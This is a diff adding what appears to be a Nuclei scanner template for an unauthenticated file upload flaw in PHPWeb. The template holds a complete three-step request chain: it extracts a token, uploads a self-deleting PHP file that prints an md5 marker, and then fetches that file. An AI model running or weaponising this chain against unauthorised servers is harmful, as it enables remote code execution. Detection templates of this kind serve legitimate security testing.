@@ -1,0 +1,110 @@
+id: phpweb-file-upload-ct-416589
+
+info:
+  name: PHPWeb File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Exploits an unauthenticated file upload vulnerability in PHPWeb to execute arbitrary PHP code.
+
+variables:
+  f1: "{{rand_int(40000, 44800)}}"
+  rboundary: "{{rand_base(8)}}"
+  randname: "{{rand_base(6)}}"
+
+http:
+  - id: step1
+    method: POST
+    path:
+      - "{{BaseURL}}/base/post.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: act=appcode
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "k=(?P<key>\\w+)&t=(?P<token>\\d+)"
+    extractors:
+      - type: regex
+        name: key
+        group: 1
+        regex:
+          - "k=(\\w+)&t=\\d+"
+        internal: true
+      - type: regex
+        name: token
+        group: 1
+        regex:
+          - "k=\\w+&t=(\\d+)"
+        internal: true
+      - type: dsl
+        dsl:
+          - "md5(key + token)"
+        name: md
+        internal: true
+
+  - id: step2
+    method: POST
+    path:
+      - "{{BaseURL}}/base/appplus.php"
+    headers:
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
+    body: |
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="file"; filename="{{randname}}.php"
+      Content-Type: application/octet-stream
+
+      <?php echo md5({{f1}});unlink(__FILE__);?>
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="act"
+
+      upload
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="r_size"
+
+      41
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="t"
+
+      {{token}}
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="m"
+
+      {{md}}
+      ------WebKitFormBoundary{{rboundary}}
+      Content-Disposition: form-data; name="path"
+
+      upload
+      ------WebKitFormBoundary{{rboundary}}--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "upload/(?P<fname>\\w+.php)"
+    extractors:
+      - type: regex
+        name: fname
+        regex:
+          - "upload/(\\w+.php)"
+        group: 1
+        internal: true
+
+  - id: step3
+    method: GET
+    path:
+      - "{{BaseURL}}/upload/{{fname}}"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5(f1)}}"
